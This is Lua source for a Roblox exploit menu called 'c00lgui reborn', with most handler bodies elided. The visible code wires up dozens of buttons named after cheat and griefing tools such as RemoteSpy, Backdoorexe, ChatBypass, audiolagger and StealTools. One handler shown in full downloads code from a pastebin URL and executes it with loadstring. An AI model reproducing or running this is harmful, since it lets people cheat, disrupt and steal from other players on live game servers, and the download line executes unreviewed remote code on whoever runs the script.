...
if hello == true then
	...
	Title_12.Size = UDim2.new(1, 0, 0, 40)
	Title_12.ZIndex = 2
	Title_12.Font = Enum.Font.SourceSans
	Title_12.Text = "c00lgui reborn V3.5 by rusello25"
	Title_12.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title_12.TextSize = 24.000
	...
	local function JTMMF_fake_script() -- Backdoorexe.LocalScript 
	...
	coroutine.wrap(JTMMF_fake_script)()
	local function PCMUIN_fake_script() -- ScriptSpy.LocalScript 
	...
	coroutine.wrap(PCMUIN_fake_script)()
	local function BICUU_fake_script() -- T0PK3K.LocalScript 
	...
	coroutine.wrap(BICUU_fake_script)()
	local function HTQJTR_fake_script() -- audiolagger.LocalScript 
	...
	coroutine.wrap(HTQJTR_fake_script)()
	local function BSKZRPU_fake_script() -- RemoteSpy.LocalScript 
	...
	coroutine.wrap(BSKZRPU_fake_script)()
	local function ZYHWX_fake_script() -- InfiniteYield.LocalScript 
	...
	coroutine.wrap(ZYHWX_fake_script)()
	local function QGACXJX_fake_script() -- FatesAdmin.LocalScript 
	...
	coroutine.wrap(QGACXJX_fake_script)()
	local function VBKDRAH_fake_script() -- UnanchoredGui.LocalScript 
	...
	coroutine.wrap(VBKDRAH_fake_script)()
	local function NZQTESU_fake_script() -- ChatHaxx.LocalScript 
	...
	coroutine.wrap(NZQTESU_fake_script)()
	local function UTSW_fake_script() -- PendulumHub.LocalScript 
	...
	coroutine.wrap(UTSW_fake_script)()
	local function FSROINM_fake_script() -- Hydroxide.LocalScript 
	...
	coroutine.wrap(FSROINM_fake_script)()
	local function RBIZKK_fake_script() -- Opfinality.LocalScript 
	...
	coroutine.wrap(RBIZKK_fake_script)()
	local function EWTLNW_fake_script() -- Homebrewadmin.LocalScript 
	...
	coroutine.wrap(EWTLNW_fake_script)()
	local function EGNB_fake_script() -- CMDX.LocalScript 
	...
	coroutine.wrap(EGNB_fake_script)()
	local function NLXI_fake_script() -- Bringallplayersheads.LocalScript 
	...
	coroutine.wrap(NLXI_fake_script)()
	local function HGRQY_fake_script() -- singc00lkiddtheme.LocalScript 
	...
	coroutine.wrap(HGRQY_fake_script)()
	local function RXGY_fake_script() -- Platform.LocalScript 
	...
	coroutine.wrap(RXGY_fake_script)()
	local function ZPVSFB_fake_script() -- HeadFling.LocalScript 
	...
	coroutine.wrap(ZPVSFB_fake_script)()
	local function FZCAO_fake_script() -- ChatBypass.LocalScript 
	...
	coroutine.wrap(FZCAO_fake_script)()
	local function BLDPLMN_fake_script() -- FloatingPad.LocalScript 
	...
	coroutine.wrap(BLDPLMN_fake_script)()
	local function VVOR_fake_script() -- HeadShake.LocalScript 
	...
	coroutine.wrap(VVOR_fake_script)()
	local function JQVPZ_fake_script() -- NameTag.LocalScript 
	...
	coroutine.wrap(JQVPZ_fake_script)()
	local function JEXM_fake_script() -- ControlNPCs.LocalScript 
	...
	coroutine.wrap(JEXM_fake_script)()
	local function GTQAJ_fake_script() -- Getallitems.LocalScript 
	...
	coroutine.wrap(GTQAJ_fake_script)()
	local function AASOS_fake_script() -- Blackhole.LocalScript 
	...
	coroutine.wrap(AASOS_fake_script)()
	local function NTTSS_fake_script() -- WalkOnWalls.LocalScript 
	...
	coroutine.wrap(NTTSS_fake_script)()
	local function CTOEFOG_fake_script() -- SCP173.LocalScript 
	...
	coroutine.wrap(CTOEFOG_fake_script)()
	local function LJNM_fake_script() -- SCP106.LocalScript 
	...
	coroutine.wrap(LJNM_fake_script)()
	local function PZJOMD_fake_script() -- TextButton.LocalScript 
	...
	coroutine.wrap(PZJOMD_fake_script)()
	local function IHDLTP_fake_script() -- TextButton_2.LocalScript 
	...
	coroutine.wrap(IHDLTP_fake_script)()
	local function CJMKAWG_fake_script() -- TextButton_3.LocalScript 
	...
	coroutine.wrap(CJMKAWG_fake_script)()
	local function RAFRHN_fake_script() -- TextButton_4.LocalScript 
	...
	coroutine.wrap(RAFRHN_fake_script)()
	local function LKTTPKO_fake_script() -- TextButton_5.LocalScript 
	...
	coroutine.wrap(LKTTPKO_fake_script)()
	local function NVVCJ_fake_script() -- TextButton_6.LocalScript 
		local script = Instance.new('LocalScript', TextButton_6)

		script.Parent.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.Parent.Parent.Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent["Close/Open"].Visible = false
			loadstring(game:HttpGet(('https://pastebin.com/raw/wa3c18cb'),true))()
		end)
	end
	coroutine.wrap(NVVCJ_fake_script)()
	local function HCZZREI_fake_script() -- Page3.LocalScript 
	...
	coroutine.wrap(HCZZREI_fake_script)()
	local function UAJK_fake_script() -- idk.LocalScript 
	...
	coroutine.wrap(UAJK_fake_script)()
	local function KPYW_fake_script() -- Next.LocalScript 
	...
	coroutine.wrap(KPYW_fake_script)()
	local function UFZVEPP_fake_script() -- Previous.LocalScript 
	...
	coroutine.wrap(UFZVEPP_fake_script)()
	local function EZBBQBE_fake_script() -- SuicideGun.LocalScript 
	...
	coroutine.wrap(EZBBQBE_fake_script)()
	local function HPKVVYK_fake_script() -- GravityGun.LocalScript 
	...
	coroutine.wrap(HPKVVYK_fake_script)()
	local function KGHKQMM_fake_script() -- StealTools.LocalScript 
	...
	coroutine.wrap(KGHKQMM_fake_script)()
	local function NRLMRBG_fake_script() -- DevUzi.LocalScript 
	...
	coroutine.wrap(NRLMRBG_fake_script)()
	local function JUPXU_fake_script() -- M4Carbine.LocalScript 
	...
	coroutine.wrap(JUPXU_fake_script)()
	local function TWNUX_fake_script() -- Uzi.LocalScript 
	...
	coroutine.wrap(TWNUX_fake_script)()
	local function TIUJBEB_fake_script() -- AK47.LocalScript 
	...
	coroutine.wrap(TIUJBEB_fake_script)()
	local function YVMJHH_fake_script() -- M3GreaseGun.LocalScript 
	...
	coroutine.wrap(YVMJHH_fake_script)()
	local function KVYFLP_fake_script() -- Goner.LocalScript 
	...
	coroutine.wrap(KVYFLP_fake_script)()
	local function PODIAKI_fake_script() -- TrueSSHub.LocalScript 
	...
	coroutine.wrap(PODIAKI_fake_script)()
	local function QXVINW_fake_script() -- GoodCopBadCop.LocalScript 
	...
	coroutine.wrap(QXVINW_fake_script)()
	local function BONBOXV_fake_script() -- FallenAnger.LocalScript 
	...
	coroutine.wrap(BONBOXV_fake_script)()
	local function TWDZFBQ_fake_script() -- NullwareHub.LocalScript 
	...
	coroutine.wrap(TWDZFBQ_fake_script)()
	local function LDKRP_fake_script() -- PunchScript.LocalScript 
	...
	coroutine.wrap(LDKRP_fake_script)()
	local function UDSW_fake_script() -- _500PoundsBall.LocalScript 
	...
	coroutine.wrap(UDSW_fake_script)()
	local function PPKPE_fake_script() -- GermanSoldier.LocalScript 
	...
	coroutine.wrap(PPKPE_fake_script)()
	local function HVCXNXG_fake_script() -- Minigun.LocalScript 
	...
	coroutine.wrap(HVCXNXG_fake_script)()
	local function ZKTMK_fake_script() -- GKV3.LocalScript 
	...
	coroutine.wrap(ZKTMK_fake_script)()
	local function KPXOF_fake_script() -- GrabKnifeV4.LocalScript 
	...
	coroutine.wrap(KPXOF_fake_script)()
	local function COCA_fake_script() -- idk_2.LocalScript 
	...
	coroutine.wrap(COCA_fake_script)()
	local function NXFUJK_fake_script() -- Clear.LocalScript 
	...
	coroutine.wrap(NXFUJK_fake_script)()
	local function RUUWFDG_fake_script() -- Execute.Script 
	...
	coroutine.wrap(RUUWFDG_fake_script)()
	local function MOFRUWS_fake_script() -- CloseOpen.LocalScript 
